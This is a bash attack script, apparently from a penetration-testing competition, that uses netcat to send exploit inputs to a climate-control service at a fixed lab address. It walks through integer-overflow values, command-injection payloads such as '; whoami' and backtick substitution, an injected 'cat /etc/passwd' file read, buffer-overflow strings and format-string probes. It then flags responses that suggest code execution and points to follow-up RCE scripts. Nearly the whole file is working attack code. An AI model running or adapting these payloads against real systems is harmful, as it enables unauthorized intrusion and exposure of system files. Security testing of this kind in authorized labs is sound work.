#!/bin/bash
#
# Quick Climate Control Exploitation Test Script
# For rapid manual testing of integer overflow vulnerability
#

TARGET="10.0.1.10"
PORT="6768"
EVIDENCE_DIR="/home/pentester/cptc/hosts/10.0.1.10-custom-control/evidence/climate-overflow-exploitation"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}======================================================================${NC}"
echo -e "${BLUE}  Climate Control Quick Exploitation Test${NC}"
echo -e "${BLUE}  Target: ${TARGET}:${PORT}${NC}"
echo -e "${BLUE}======================================================================${NC}"

# Function to send command and capture output
send_command() {
    local command="$1"
    local description="$2"
    local output_file="$3"

    echo -e "\n${YELLOW}[*] Testing: ${description}${NC}"
    echo -e "${YELLOW}    Command: ${command}${NC}"

    # Send command via netcat and capture output
    (echo "$command"; sleep 2; echo "EXIT") | nc -w 3 "$TARGET" "$PORT" > "$output_file" 2>&1

    # Display result
    if [ -s "$output_file" ]; then
        echo -e "${GREEN}[+] Response received:${NC}"
        head -20 "$output_file" | sed 's/^/    /'

        # Check for interesting patterns
        if grep -qi "uid=\|gid=\|root\|bash\|/home/\|/etc/" "$output_file"; then
            echo -e "${RED}[!!!] POSSIBLE CODE EXECUTION DETECTED !!!${NC}"
        elif grep -qi "error\|invalid\|crash\|segmentation" "$output_file"; then
            echo -e "${RED}[!] Error or crash detected${NC}"
        fi
    else
        echo -e "${RED}[!] No response or connection failed${NC}"
    fi

    sleep 1
}

# Create evidence directory
mkdir -p "$EVIDENCE_DIR/quick-tests"

echo -e "\n${BLUE}[*] PHASE 1: Integer Overflow Testing${NC}"

# Test INT_MAX values
send_command "SET 2147483647" \
    "INT32_MAX" \
    "$EVIDENCE_DIR/quick-tests/01-int32-max.txt"

send_command "SET 2147483648" \
    "INT32_MAX + 1 (overflow)" \
    "$EVIDENCE_DIR/quick-tests/02-int32-overflow.txt"

send_command "SET -2147483648" \
    "INT32_MIN" \
    "$EVIDENCE_DIR/quick-tests/03-int32-min.txt"

send_command "SET 999999999999" \
    "Very large value" \
    "$EVIDENCE_DIR/quick-tests/04-large-value.txt"

send_command "SET -999999999999" \
    "Very large negative" \
    "$EVIDENCE_DIR/quick-tests/05-large-negative.txt"

send_command "STATUS" \
    "Check current status" \
    "$EVIDENCE_DIR/quick-tests/06-status-check.txt"

echo -e "\n${BLUE}[*] PHASE 2: Command Injection Testing${NC}"

# Basic command injection
send_command "SET 72; whoami" \
    "Semicolon command injection - whoami" \
    "$EVIDENCE_DIR/quick-tests/10-cmd-whoami.txt"

send_command "SET 72; id" \
    "Semicolon command injection - id" \
    "$EVIDENCE_DIR/quick-tests/11-cmd-id.txt"

send_command "SET 72; pwd" \
    "Semicolon command injection - pwd" \
    "$EVIDENCE_DIR/quick-tests/12-cmd-pwd.txt"

send_command "SET 72; uname -a" \
    "Semicolon command injection - uname" \
    "$EVIDENCE_DIR/quick-tests/13-cmd-uname.txt"

send_command "SET \$(whoami)" \
    "Dollar substitution - whoami" \
    "$EVIDENCE_DIR/quick-tests/14-dollar-whoami.txt"

send_command "SET \`whoami\`" \
    "Backtick substitution - whoami" \
    "$EVIDENCE_DIR/quick-tests/15-backtick-whoami.txt"

send_command "SET 72 | whoami" \
    "Pipe command injection" \
    "$EVIDENCE_DIR/quick-tests/16-pipe-whoami.txt"

send_command "SET 72 && whoami" \
    "AND command injection" \
    "$EVIDENCE_DIR/quick-tests/17-and-whoami.txt"

echo -e "\n${BLUE}[*] PHASE 3: File Access Testing${NC}"

send_command "SET 72; cat /etc/passwd" \
    "Read /etc/passwd" \
    "$EVIDENCE_DIR/quick-tests/20-read-passwd.txt"

send_command "SET 72; ls -la /" \
    "List root directory" \
    "$EVIDENCE_DIR/quick-tests/21-ls-root.txt"

send_command "SET 72; cat /proc/version" \
    "Read proc version" \
    "$EVIDENCE_DIR/quick-tests/22-proc-version.txt"

echo -e "\n${BLUE}[*] PHASE 4: Buffer Overflow Testing${NC}"

# Small buffers
send_command "SET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
    "50 A's" \
    "$EVIDENCE_DIR/quick-tests/30-buffer-50.txt"

send_command "SET $(python3 -c 'print("A"*100)')" \
    "100 A's" \
    "$EVIDENCE_DIR/quick-tests/31-buffer-100.txt"

send_command "SET $(python3 -c 'print("A"*1000)')" \
    "1000 A's" \
    "$EVIDENCE_DIR/quick-tests/32-buffer-1000.txt"

echo -e "\n${BLUE}[*] PHASE 5: Format String Testing${NC}"

send_command "SET %x%x%x%x" \
    "Format string - hex" \
    "$EVIDENCE_DIR/quick-tests/40-format-hex.txt"

send_command "SET %s%s%s%s" \
    "Format string - string" \
    "$EVIDENCE_DIR/quick-tests/41-format-string.txt"

send_command "SET %p%p%p%p" \
    "Format string - pointer" \
    "$EVIDENCE_DIR/quick-tests/42-format-pointer.txt"

echo -e "\n${BLUE}======================================================================${NC}"
echo -e "${BLUE}  Quick Test Complete${NC}"
echo -e "${BLUE}  Evidence saved to: ${EVIDENCE_DIR}/quick-tests/${NC}"
echo -e "${BLUE}======================================================================${NC}"

# Summary
echo -e "\n${GREEN}[+] Test Summary:${NC}"
ls -lh "$EVIDENCE_DIR/quick-tests/" | tail -n +2 | wc -l | xargs echo "    Total test files:"

echo -e "\n${YELLOW}[*] Checking for interesting results...${NC}"

# Check for potential RCE
if grep -rqi "uid=\|gid=\|root" "$EVIDENCE_DIR/quick-tests/"; then
    echo -e "${RED}[!!!] POTENTIAL CODE EXECUTION FOUND - Check files above${NC}"
fi

# Check for crashes
if grep -rqi "error\|invalid\|crash" "$EVIDENCE_DIR/quick-tests/"; then
    echo -e "${YELLOW}[!] Errors or potential crashes detected${NC}"
fi

echo -e "\n${GREEN}[+] Review individual files for detailed results${NC}"
echo -e "${GREEN}[+] To view a file: cat ${EVIDENCE_DIR}/quick-tests/<filename>${NC}"

echo -e "\n${BLUE}Next steps:${NC}"
echo -e "  1. Run full exploitation: python3 /home/pentester/cptc/hosts/10.0.1.10-custom-control/scripts/climate-exploit-coordinator.py"
echo -e "  2. Run fuzzer: python3 /home/pentester/cptc/hosts/10.0.1.10-custom-control/scripts/climate-fuzzer.py"
echo -e "  3. Run RCE attempts: python3 /home/pentester/cptc/hosts/10.0.1.10-custom-control/scripts/climate-rce.py"
